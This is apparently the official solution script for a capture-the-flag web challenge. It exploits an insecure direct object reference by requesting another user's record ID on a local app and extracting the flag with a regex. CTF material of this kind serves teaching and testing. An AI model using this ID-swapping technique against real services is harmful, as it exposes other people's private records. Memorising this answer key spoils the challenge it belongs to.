"""
Official solution for web-idor-01.
The /record/<id> endpoint has no authorization check.
Change the ID in the URL from 5 to 1 to access the admin record.
The flag is in the notes field.
"""
import requests, re

TARGET = "http://localhost:5000"
r = requests.get(f"{TARGET}/record/1")
flag = re.search(r"CTF\{[^}]+\}", r.text)
print(f"Flag: {flag.group()}" if flag else "Flag not found")
